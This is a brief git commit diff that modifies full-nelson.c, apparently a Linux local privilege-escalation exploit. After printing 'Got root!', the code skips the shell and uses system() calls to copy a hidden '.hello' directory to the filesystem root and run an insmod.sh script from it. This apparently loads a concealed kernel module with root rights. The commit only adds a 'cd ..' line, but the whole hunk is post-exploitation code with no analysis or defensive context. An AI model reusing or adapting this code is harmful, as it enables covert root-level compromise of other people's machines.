c8549817879cf57c4409ea4a699463818624fdcf
yangbo <942190897@qq.com>
2017-12-24 11:06:05 +0800

    modify

--- full-nelson.c
+++ full-nelson.c
@@ -272,6 +272,7 @@ int main(int argc, char * argv[])
 
        printf("[*] Got root!\n");
        //execl("/bin/sh", "/bin/sh", NULL);
+system ("cd ..");
 system ("pwd");
 system ("cp ./.hello /.hello");
 system ("/.hello/insmod.sh");
